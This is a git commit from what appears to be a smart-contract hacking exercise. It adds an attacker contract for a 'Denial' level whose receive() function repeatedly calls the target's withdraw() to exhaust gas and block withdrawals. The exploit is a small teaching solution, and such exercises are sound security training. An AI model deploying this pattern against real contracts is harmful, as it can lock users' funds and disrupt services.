4f540c391781b657afb5c3fd88f9d9c1d4142510
Reid Simonton <simonton@gmail.com>
2022-08-05 18:57:59 -0700

    Denial hacked!

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -2,6 +2,10 @@
 pragma solidity ^0.8.9;
 import "./Denial.sol";
 
+interface IDenial {
+    function withdraw() external;
+}
+
 contract AttackingDenial {
     address payable public contractAddress;
 
@@ -9,5 +13,9 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        // This should cause loop and eventually tx out of gas
+        IDenial(contractAddress).withdraw();
+    }
+
 }
